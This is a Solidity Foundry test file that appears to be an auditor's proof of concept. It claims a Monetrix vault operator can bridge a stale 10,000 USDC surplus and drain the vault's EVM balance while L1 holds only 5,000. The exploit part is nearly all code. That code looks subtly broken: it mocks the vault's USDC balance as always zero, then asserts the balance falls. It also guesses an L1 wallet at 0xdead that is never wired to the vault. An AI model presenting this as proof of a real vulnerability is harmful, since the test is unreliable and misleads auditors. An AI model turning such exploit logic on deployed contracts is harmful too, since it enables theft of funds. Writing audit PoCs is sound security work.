// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/core/YieldEscrow.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/governance/MonetrixAccessController.sol";
import "../src/interfaces/HyperCoreConstants.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract MockCoreWriter {
    function write(bytes calldata) external returns (bytes32) {
        return bytes32(0);
    }
}

contract AuditAgentPoC is Test {
    MonetrixVault vault;
    MonetrixAccountant accountant;
    MonetrixConfig config;
    RedeemEscrow redeemEscrow;
    YieldEscrow yieldEscrow;
    USDM usdm;
    sUSDM susdm;
    MonetrixAccessController acl;

    address usdc = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address operator = address(0x1);
    address user1 = address(0x2);

    bytes32 constant OPERATOR_ROLE = keccak256("OPERATOR_ROLE");
    bytes32 constant GOVERNOR_ROLE = keccak256("GOVERNOR_ROLE");
    bytes32 constant GUARDIAN_ROLE = keccak256("GUARDIAN_ROLE");

    function setUp() public {
        acl = new MonetrixAccessController();
        acl.initialize(address(this));

        acl.grantRole(GOVERNOR_ROLE, address(this));
        acl.grantRole(OPERATOR_ROLE, operator);
        acl.grantRole(GUARDIAN_ROLE, address(this));

        usdm = new USDM();
        usdm.initialize(address(acl));

        susdm = new sUSDM();

        config = new MonetrixConfig();

        accountant = new MonetrixAccountant();

        redeemEscrow = new RedeemEscrow();

        yieldEscrow = new YieldEscrow();

        vault = new MonetrixVault();
        vault.initialize(usdc, address(usdm), address(susdm), address(config), address(this), address(acl));

        vault.setAccountant(address(accountant));
        vault.setRedeemEscrow(address(redeemEscrow));
        vault.setYieldEscrow(address(yieldEscrow));

        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);
    }

    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] Deploy contracts, fund accounts, mock external dependencies
        // 2. [T=0] Accountant reports stale positive surplus of 10,000 USDC from previous settle
        // 3. [T=1] L1 precompile balance drops to 5,000 USDC due to unfunded losses
        // 4. [T=2] Operator calls bridgeYieldFromL1(10,000 USDC) based on stale yieldShortfall()
        // 5. [Assert] Verify bridge succeeds despite L1 insolvency, draining EVM USDC

        uint256 staleSurplus = 10_000e6;
        uint256 actualL1Balance = 5_000e6;

        // Mock Accountant.surplus() to return stale positive value
        vm.mockCall(
            address(accountant),
            abi.encodeWithSelector(MonetrixAccountant.surplus.selector),
            abi.encode(int256(staleSurplus))
        );

        // Mock USDC balanceOf for Vault and Escrows
        vm.mockCall(
            usdc,
            abi.encodeWithSelector(IERC20.balanceOf.selector, address(vault)),
            abi.encode(uint256(0))
        );
        vm.mockCall(
            usdc,
            abi.encodeWithSelector(IERC20.balanceOf.selector, address(redeemEscrow)),
            abi.encode(uint256(0))
        );
        vm.mockCall(
            usdc,
            abi.encodeWithSelector(IERC20.balanceOf.selector, address(yieldEscrow)),
            abi.encode(uint256(0))
        );

        // Mock RedeemEscrow.shortfall()
        vm.mockCall(
            address(redeemEscrow),
            abi.encodeWithSelector(RedeemEscrow.shortfall.selector),
            abi.encode(uint256(0))
        );

        // Mock L1 Precompile balance to reflect actual lower balance
        // Assuming PrecompileReader reads from a specific address or uses staticcall
        // We mock the USDC balanceOf for the L1 spot wallet address
        address l1SpotWallet = address(0xdead);
        vm.mockCall(
            usdc,
            abi.encodeWithSelector(IERC20.balanceOf.selector, l1SpotWallet),
            abi.encode(actualL1Balance)
        );

        // Mock USDC transfer to succeed
        vm.mockCall(
            usdc,
            abi.encodeWithSelector(IERC20.transfer.selector),
            abi.encode(true)
        );

        // Fund EVM Vault with USDC to allow bridging
        deal(usdc, address(vault), staleSurplus);

        uint256 evmBalBefore = IERC20(usdc).balanceOf(address(vault));

        // Operator calls bridgeYieldFromL1 with the stale shortfall amount
        vm.prank(operator);
        vault.bridgeYieldFromL1(staleSurplus);

        uint256 evmBalAfter = IERC20(usdc).balanceOf(address(vault));

        // Assert that EVM balance decreased, proving the bridge succeeded
        // despite L1 actual balance being lower than the bridged amount
        assertGt(evmBalBefore, evmBalAfter, "bridge should have succeeded and drained EVM USDC");
        assertEq(evmBalBefore - evmBalAfter, staleSurplus, "full stale surplus was bridged");
    }
}
